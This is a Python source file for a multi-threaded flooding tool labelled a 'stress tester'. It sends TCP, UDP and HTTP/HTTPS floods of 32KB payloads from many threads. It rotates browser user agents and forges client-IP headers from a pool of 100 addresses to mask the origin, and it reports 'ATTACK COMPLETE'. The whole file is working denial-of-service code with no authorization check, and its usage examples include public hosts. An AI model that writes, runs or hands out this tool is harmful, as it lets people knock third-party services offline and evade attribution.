import socket
import threading
import time
import sys
import random
import argparse
import ssl
from urllib.parse import urlparse

# Multiple user agents for variety
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
]

# List of 100 IP addresses for spoofing (mix of public and private IPs)
SPOOFED_IPS = [
    # Public IPs
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "64.6.64.6",
    "185.228.168.168", "76.76.19.19", "94.140.14.14", "84.200.69.80",
    "8.26.56.26", "195.46.39.39", "209.244.0.3", "216.146.35.35",
    "198.101.242.72", "77.88.8.8", "91.239.100.100", "89.233.43.71",
    "74.82.42.42", "109.69.8.51", "156.154.70.1", "199.85.126.10",
    "81.218.119.11", "195.130.131.131", "69.195.152.134", "192.71.245.208",
    
    # More public IPs
    "203.0.113.1", "203.0.113.2", "203.0.113.3", "203.0.113.4", "203.0.113.5",
    "198.51.100.1", "198.51.100.2", "198.51.100.3", "198.51.100.4", "198.51.100.5",
    "192.0.2.1", "192.0.2.2", "192.0.2.3", "192.0.2.4", "192.0.2.5",
    
    # Cloud provider IPs
    "34.160.10.45", "52.14.190.201", "104.196.123.234", "35.186.238.101",
    "13.56.210.42", "18.144.76.189", "54.183.12.34", "3.120.187.56",
    "13.124.89.123", "35.180.1.1", "52.47.189.22", "18.198.12.34",
    
    # Common ISP IPs
    "74.125.28.103", "172.217.3.110", "216.58.192.142", "142.250.74.46",
    "104.16.249.249", "104.16.248.249", "151.101.1.69", "151.101.65.69",
    "13.107.246.254", "204.79.197.254", "23.43.61.42", "23.218.212.69",
    
    # Private IP ranges (10.x.x.x)
    "10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5",
    "10.1.1.1", "10.1.1.2", "10.1.1.3", "10.1.1.4", "10.1.1.5",
    "10.10.10.1", "10.10.10.2", "10.10.10.3", "10.10.10.4", "10.10.10.5",
    "10.100.100.1", "10.100.100.2", "10.100.100.3", "10.100.100.4", "10.100.100.5",
    
    # Private IP ranges (192.168.x.x)
    "192.168.0.1", "192.168.0.2", "192.168.0.3", "192.168.0.4", "192.168.0.5",
    "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5",
    "192.168.10.1", "192.168.10.2", "192.168.10.3", "192.168.10.4", "192.168.10.5",
    "192.168.100.1", "192.168.100.2", "192.168.100.3", "192.168.100.4", "192.168.100.5",
    
    # Private IP ranges (172.16.x.x - 172.31.x.x)
    "172.16.0.1", "172.16.0.2", "172.16.0.3", "172.16.0.4", "172.16.0.5",
    "172.31.255.254", "172.31.255.253", "172.31.255.252", "172.31.255.251", "172.31.255.250",
    
    # More random IPs to reach 100
    "45.33.32.156", "72.14.184.100", "66.220.144.0", "31.13.71.1",
    "69.63.176.13", "199.96.57.6", "98.137.246.8", "173.194.33.104",
    "207.46.197.32", "65.55.175.254", "157.56.106.189", "204.79.197.200",
    "131.253.33.254", "23.96.52.53", "104.43.195.251", "52.109.76.10",
]

class UltraStressTester:
    def __init__(self, spoof_ips=True):
        self.active = False
        self.stats_lock = threading.Lock()
        self.stats = {
            'requests': 0,
            'bytes_sent': 0,
            'tcp_packets': 0,
            'udp_packets': 0,
            'http_requests': 0,
            'unique_ips_used': set(),
        }
        self.start_time = None
        self.spoof_ips = spoof_ips
        
        # 32KB payload for all protocols
        self.payload = b'X' * 32000
        
    def get_spoofed_ip(self):
        """Get a random spoofed IP and track it"""
        ip = random.choice(SPOOFED_IPS)
        with self.stats_lock:
            self.stats['unique_ips_used'].add(ip)
        return ip
    
    def create_http_request(self, host, port, spoof_ip=None):
        """Create HTTP request with optional spoofed IP headers"""
        user_agent = random.choice(USER_AGENTS)
        
        # Build headers
        headers = [
            f"POST / HTTP/1.1",
            f"Host: {host}:{port}",
            f"User-Agent: {user_agent}",
            f"Content-Type: application/octet-stream",
            f"Content-Length: {len(self.payload)}",
            f"Connection: close",
        ]
        
        # Add spoofed IP headers if enabled
        if self.spoof_ips and spoof_ip:
            spoof_headers = [
                f"X-Forwarded-For: {spoof_ip}",
                f"X-Real-IP: {spoof_ip}",
                f"CF-Connecting-IP: {spoof_ip}",
                f"True-Client-IP: {spoof_ip}",
                f"X-Cluster-Client-IP: {spoof_ip}",
                f"Forwarded: for={spoof_ip}",
            ]
            # Add 2-4 random spoof headers
            headers.extend(random.sample(spoof_headers, random.randint(2, 4)))
        
        # Randomize header order to look more natural
        random.shuffle(headers[1:])  # Don't shuffle the first line
        
        # Build request
        request_str = "\r\n".join(headers) + "\r\n\r\n"
        return request_str.encode() + self.payload
    
    # ==================== PROTOCOL METHODS ====================
    
    def tcp_flood(self, host, port):
        """Raw TCP flood - sends raw data without HTTP headers"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, port))
                sock.send(self.payload)
                sock.close()
                
                with self.stats_lock:
                    self.stats['tcp_packets'] += 1
                    self.stats['bytes_sent'] += len(self.payload)
            except:
                pass
    
    def udp_flood(self, host, port):
        """UDP flood - connectionless, fastest"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0)
        
        while self.active:
            try:
                # Get spoofed IP info for stats
                if self.spoof_ips:
                    self.get_spoofed_ip()
                
                # UDP is connectionless, just send
                sock.sendto(self.payload, (host, port))
                
                with self.stats_lock:
                    self.stats['udp_packets'] += 1
                    self.stats['bytes_sent'] += len(self.payload)
            except:
                pass
    
    def http_flood(self, host, port, use_ssl=False):
        """HTTP flood with proper headers and IP spoofing"""
        while self.active:
            try:
                # Get a random spoofed IP for this request
                spoof_ip = self.get_spoofed_ip() if self.spoof_ips else None
                
                # Create HTTP request
                request = self.create_http_request(host, port, spoof_ip)
                
                if use_ssl:
                    # HTTPS
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    raw_sock.settimeout(1)
                    sock = context.wrap_socket(raw_sock, server_hostname=host)
                else:
                    # HTTP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                
                sock.connect((host, port))
                sock.send(request)
                sock.close()
                
                with self.stats_lock:
                    self.stats['http_requests'] += 1
                    self.stats['bytes_sent'] += len(request)
                    self.stats['requests'] += 1
            except:
                pass
    
    def mixed_attack(self, host, port):
        """Mixed attack - alternates between protocols"""
        protocols = ['tcp', 'http']
        
        while self.active:
            proto = random.choice(protocols)
            
            try:
                if proto == 'tcp':
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((host, port))
                    sock.send(self.payload)
                    sock.close()
                    
                    with self.stats_lock:
                        self.stats['tcp_packets'] += 1
                        self.stats['bytes_sent'] += len(self.payload)
                
                elif proto == 'http':
                    # Get a random spoofed IP
                    spoof_ip = self.get_spoofed_ip() if self.spoof_ips else None
                    request = self.create_http_request(host, port, spoof_ip)
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((host, port))
                    sock.send(request)
                    sock.close()
                    
                    with self.stats_lock:
                        self.stats['http_requests'] += 1
                        self.stats['bytes_sent'] += len(request)
                        self.stats['requests'] += 1
                
                elif proto == 'udp':
                    # Get spoofed IP for stats
                    if self.spoof_ips:
                        self.get_spoofed_ip()
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0)
                    sock.sendto(self.payload[:1024], (host, port))
                    
                    with self.stats_lock:
                        self.stats['udp_packets'] += 1
                        self.stats['bytes_sent'] += 1024
            
            except:
                pass
    
    # ==================== CONTROL METHODS ====================
    
    def start_attack(self, host, port, protocol='http', threads=64, duration=30, use_ssl=False):
        """Start the attack with specified protocol"""
        self.active = True
        self.start_time = time.time()
        
        print(f"🚀 ULTRA-STRESS TEST STARTING")
        print(f"Target: {host}:{port}")
        print(f"Protocol: {protocol.upper()}")
        print(f"Threads: {threads}")
        print(f"Payload: 32KB per packet")
        print(f"Duration: {duration} seconds")
        print(f"IP Spoofing: {'ENABLED' if self.spoof_ips else 'DISABLED'}")
        print(f"Spoof IP Pool: {len(SPOOFED_IPS)} IP addresses")
        print(f"User Agents: {len(USER_AGENTS)} different")
        print("-" * 60)
        
        # Select worker function based on protocol
        if protocol == 'tcp':
            worker_func = lambda: self.tcp_flood(host, port)
        elif protocol == 'udp':
            worker_func = lambda: self.udp_flood(host, port)
        elif protocol == 'http':
            worker_func = lambda: self.http_flood(host, port, use_ssl)
        elif protocol == 'https':
            worker_func = lambda: self.http_flood(host, port, True)
        elif protocol == 'mixed':
            worker_func = lambda: self.mixed_attack(host, port)
        else:
            print(f"Unknown protocol: {protocol}")
            return
        
        # Start worker threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker_func)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            # Run for duration
            end_time = time.time() + duration
            
            while time.time() < end_time and self.active:
                time.sleep(0.3)  # Update stats frequently
                self.display_stats()
                
        except KeyboardInterrupt:
            print("\n\n⏹️ Stopped by user")
        finally:
            self.stop_attack()
            self.display_final_stats()
    
    def display_stats(self):
        """Display real-time statistics"""
        elapsed = time.time() - self.start_time
        
        with self.stats_lock:
            total_requests = (self.stats['http_requests'] + 
                            self.stats['tcp_packets'] + 
                            self.stats['udp_packets'])
            bytes_sent = self.stats['bytes_sent']
            unique_ips = len(self.stats['unique_ips_used'])
        
        if elapsed > 0:
            rps = total_requests / elapsed
            mbps = (bytes_sent * 8) / elapsed / 1000000
            mb_per_sec = bytes_sent / elapsed / (1024 * 1024)
        else:
            rps = mbps = mb_per_sec = 0
        
        sys.stdout.write(
            f"\r⚡ RPS: {rps:,.0f} | "
            f"MBit/s: {mbps:,.1f} | "
            f"Data: {mb_per_sec:.2f} MB/s | "
            f"Total: {total_requests:,} | "
            f"Unique IPs: {unique_ips} | "
            f"Time: {elapsed:.1f}s"
        )
        sys.stdout.flush()
    
    def display_final_stats(self):
        """Display final statistics"""
        elapsed = time.time() - self.start_time
        
        with self.stats_lock:
            http_req = self.stats['http_requests']
            tcp_pack = self.stats['tcp_packets']
            udp_pack = self.stats['udp_packets']
            bytes_sent = self.stats['bytes_sent']
            total_req = http_req + tcp_pack + udp_pack
            unique_ips = len(self.stats['unique_ips_used'])
        
        print("\n" + "=" * 70)
        print("🏁 ATTACK COMPLETE")
        print("=" * 70)
        print(f"Total time:         {elapsed:.2f} seconds")
        print(f"HTTP Requests:      {http_req:,}")
        print(f"TCP Packets:        {tcp_pack:,}")
        print(f"UDP Packets:        {udp_pack:,}")
        print(f"Total packets:      {total_req:,}")
        print(f"Requests/sec:       {total_req/elapsed:,.0f}")
        print(f"Unique IPs used:    {unique_ips}")
        print(f"Data sent:          {bytes_sent/(1024*1024*1024):.3f} GB")
        print(f"Throughput:         {bytes_sent/elapsed/(1024*1024):.2f} MB/s")
        print(f"Bitrate:            {bytes_sent*8/elapsed/1000000:.2f} Mbps")
        
        # Show some sample spoofed IPs if used
        if self.spoof_ips and unique_ips > 0:
            print("\nSample of spoofed IPs used:")
            sample_ips = list(self.stats['unique_ips_used'])[:10]
            for ip in sample_ips:
                print(f"  - {ip}")
            if unique_ips > 10:
                print(f"  ... and {unique_ips - 10} more")
        
        print("=" * 70)
    
    def stop_attack(self):
        """Stop the attack"""
        self.active = False
        time.sleep(1)  # Give threads time to stop


def main():
    parser = argparse.ArgumentParser(
        description='ULTRA-FAST Multi-Protocol Stress Tester with IP Spoofing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ultra_spoof.py http://localhost:8080 -p http -t 128 -d 60
  python ultra_spoof.py 192.168.1.100:80 -p udp -t 256 --no-spoof
  python ultra_spoof.py https://example.com -p https -t 64
  python ultra_spoof.py localhost:3000 -p mixed -t 192
  
Note: This adds fake IPs in HTTP headers (X-Forwarded-For, etc.)
Check your server logs to see if it detects these as spoofed!
        """
    )
    
    parser.add_argument('target', help='Target URL or host:port (e.g., http://localhost:8080 or 192.168.1.100:80)')
    parser.add_argument('-p', '--protocol', choices=['tcp', 'udp', 'http', 'https', 'mixed'], 
                       default='http', help='Attack protocol (default: http)')
    parser.add_argument('-t', '--threads', type=int, default=128, 
                       help='Number of threads (default: 128)')
    parser.add_argument('-d', '--duration', type=int, default=30, 
                       help='Duration in seconds (default: 30)')
    parser.add_argument('--payload-size', type=int, default=32000,
                       help='Payload size in bytes (default: 32000)')
    parser.add_argument('--no-spoof', action='store_true',
                       help='Disable IP spoofing (use real IP)')
    
    args = parser.parse_args()
    
    # Parse target
    target = args.target
    
    # Check if it's a URL or host:port
    if target.startswith('http://'):
        protocol = 'http'
        target = target[7:]
    elif target.startswith('https://'):
        protocol = 'https'
        target = target[8:]
    else:
        protocol = args.protocol
    
    # Extract host and port
    if ':' in target:
        if target.count(':') == 1 or ']:' in target:
            # host:port format
            if ']' in target:  # IPv6
                host = target.split(']:')[0] + ']'
                port = int(target.split(']:')[1])
            else:
                host, port_str = target.split(':', 1)
                port = int(port_str)
        else:
            # Might be IPv6 without port
            host = target
            port = 80 if protocol in ['http', 'mixed'] else 443 if protocol == 'https' else 80
    else:
        host = target
        port = 80 if protocol in ['http', 'mixed'] else 443 if protocol == 'https' else 80
    
    # Create and run tester
    tester = UltraStressTester(spoof_ips=not args.no_spoof)
    
    # Override payload size if specified
    if args.payload_size != 32000:
        tester.payload = b'X' * args.payload_size
    
    try:
        tester.start_attack(
            host=host,
            port=port,
            protocol=args.protocol,
            threads=args.threads,
            duration=args.duration,
            use_ssl=(args.protocol == 'https')
        )
    except Exception as e:
        print(f"\nError: {e}")
        print("Make sure target is accessible and port is open")


if __name__ == "__main__":
    main()